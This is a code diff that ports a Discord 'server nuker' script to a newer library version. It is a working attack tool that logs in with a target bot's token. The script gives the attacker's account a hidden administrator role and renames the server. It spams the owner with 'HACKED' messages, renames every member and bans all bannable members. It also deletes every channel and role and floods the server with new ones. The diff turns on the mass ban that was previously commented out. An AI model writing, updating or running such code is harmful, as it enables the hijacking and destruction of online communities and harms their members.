@@ -1,127 +1,125 @@
 const Discord = require("discord.js")
 const client = new Discord.Client()
-const token = "BOT_TOKEN"
+
+const configs = {
+  "targetServerID": "TARGET SERVER ID",
+  "accountID": "YOUR ID",
+  "botNickname": "BOT NAME AFTER THE HACKING",
+  "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
+  "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
+  "newServerName": "SERVER NAME AFTER THE HACKING",
+  "token": "TARGET BOT TOKEN"
+}
 
 const setAdmin = (guildID, accountID) => {
-    const targetServer = client.guilds.get(guildID)
+  try {
+    const targetServer = client.guilds.cache.get(guildID)
     if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
-    else if (!targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
+    else if (!targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
 
-    targetServer.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {
-
-        targetServer.members.get(accountID).addRole(role).catch((err) => {
+    targetServer.roles.create({data: {name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}, reason: "HACKED"}).then((role) => {
+        targetServer.members.cache.get(accountID).roles.add(role).catch((err) => {
            return console.error(`You are not in the ${targetServer.name} server ! You must to be in this server befor leveling up !`)
         })
     })
+  }catch {}
 }
- 
+  
 const changeServerInfo = (guildID, options) => {
-    const targetServer = client.guilds.get(guildID)
-    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
-    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
-    
-    targetServer.setName(options.newServerName)
-    targetServer.setIcon(options.newServerIcon)
+  const targetServer = client.guilds.cache.get(guildID)
+  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
+  else if (!targetServer.members.cache.get(client.user.id).permissions.has("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
 
-    const embed = new Discord.RichEmbed()
-    .setAuthor(client.user.tag, client.user.avatarURL)
-    .setTitle("HACKED")
-    .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN HACKED BY ${client.user.tag}`)
-    .setFooter(client.user.tag, client.user.avatarURL)
-    .setColor("#ff0000")
+  targetServer.setName(options.newServerName)
+  targetServer.setIcon(options.newServerIcon)
 
-    setInterval(() => {
-    return targetServer.owner.send(embed)
-    }, 1000)
+  const embed = new Discord.MessageEmbed()
+  .setAuthor(client.user.tag, client.user.displayAvatarURL())
+  .setTitle("HACKED")
+  .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN HACKED BY ${client.user.tag}`)
+  .setFooter(client.user.tag, client.user.displayAvatarURL())
+  .setColor("#ff0000")
+
+  setInterval(() => {
+    try {
+      let ownerid = client.guilds.cache.get(guildID).ownerID;
+      client.users.cache.get(ownerid).send(embed);
+    }catch {}
+  }, 1000)
 }
 
 const banMembers = (guildID) => {
-    const targetServer = client.guilds.get(guildID)
-    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
-    else if (!targetServer.members.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)
+  const targetServer = client.guilds.cache.get(guildID)
+  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
+  else if (!targetServer.members.cache.get(client.user.id).permissions.has("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)
 
-    targetServer.members.forEach(async (member) => {
-        member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
-    })
+  targetServer.members.cache.forEach(async (member) => {
+      member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
+  })
 }
 
 const changeNicks = (guildID, newNick) => {
-    const targetServer = client.guilds.get(guildID)
-    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
-    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)
+  const targetServer = client.guilds.cache.get(guildID)
+  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
+  else if (!targetServer.members.cache.get(client.user.id).permissions.has("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)
 
-    targetServer.members.forEach((member) => {
-        try {
-            
-            member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
-        } catch (error) {
-            undefined
-        }
-    })
+  targetServer.members.cache.forEach((member) => {
+      try {
+
+          member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
+      } catch {}
+  }) 
 }
 
-const createChanelsAndRoles = (guildID, name) => {
-    const targetServer = client.guilds.get(guildID)
-    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
-    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
-    targetServer.members.forEach((member) => {
-  		member.roles.forEach(async (role) => {
+const createChannelsAndRoles = (guildID, name) => {
+  const targetServer = client.guilds.cache.get(guildID)
+  if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
+  else if (!targetServer.members.cache.get(client.user.id).permissions.has("MANAGE_CHANNELS") || !targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.cache.get(client.user.id).permissions.has('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
+  targetServer.members.cache.forEach((member) => {
+    member.roles.cache.forEach(async (role) => {
+          try {
+              await member.removeRole(role)
+
+          } catch {}
+    })
+  })
+
+  targetServer.channels.cache.forEach(async (channel) => {
+      channel.deletable ? await channel.delete() : undefined
+  })
+
+  targetServer.roles.cache.forEach(async(role) => {
+      role.deletable ? await role.delete() : undefined
+  })
+
+  setInterval(async () => {
+    await targetServer.channels.create(name, "text")
+    await targetServer.channels.create(name, "voice")
+    await targetServer.roles.create({data: {name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }, reason: "HACKED"}).then(async(role) =>{
+        await targetServer.members.cache.forEach(async (member) => {
             try {
-                await member.removeRole(role)
-                  
-            } catch (error) {
-                undefined
-            }
-  		})
-    })
-
-    targetServer.channels.forEach(async (channel) => {
-        channel.deletable ? await channel.delete() : undefined
-    })
-
-    targetServer.roles.forEach(async(role) => {
-        role.deletable ? await role.delete() : undefined
-    })
-
-    setInterval(async () => {
-        await targetServer.createChannel(name, "text")
-        await targetServer.createChannel(name, "voice")
-        await targetServer.createRole({name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }).then(async(role) =>{
-            await targetServer.members.forEach(async (member) => {
-                try {
-                    await member.addRole(role)
-                } catch (error) {
-                    undefined
-                }
-            })
+                await member.roles.add(role)
+            } catch {}
         })
-    }, 500)
+    })
+  }, 500)
 
 }
 
 client.on("ready", () => {
-    console.log("THE HACKING STARTED NOW ")
+  console.log("THE HACKING STARTED NOW ")
 
-    // Setup YOUR personnal settings
-    const configs = {
-        "targetServerID": "SERVER_ID",
-        "accountID": "YOUR_ID",
-        "botNickname": "NEW_BOT_NAME",
-        "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
-        "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
-        "newServerName": "NEW_SERVER_NAME",
-    }
-
+  try {
     client.user.setUsername(configs.botNickname)
     client.user.setAvatar(configs.botIcon)
+  }catch {}
 
-    // Enable all the options
-    setAdmin(configs.targetServerID, configs.accountID)
-    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
-    changeNicks(configs.targetServerID, configs.botNickname)
-    // banMembers(configs.targetServerID)
-    createChanelsAndRoles(configs.targetServerID, configs.botNickname)
+  setAdmin(configs.targetServerID, configs.accountID)
+  changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
+  changeNicks(configs.targetServerID, configs.botNickname)
+  banMembers(configs.targetServerID)
+  createChannelsAndRoles(configs.targetServerID, configs.botNickname)
 })
 
 
-client.login(token)
+client.login(configs.token);
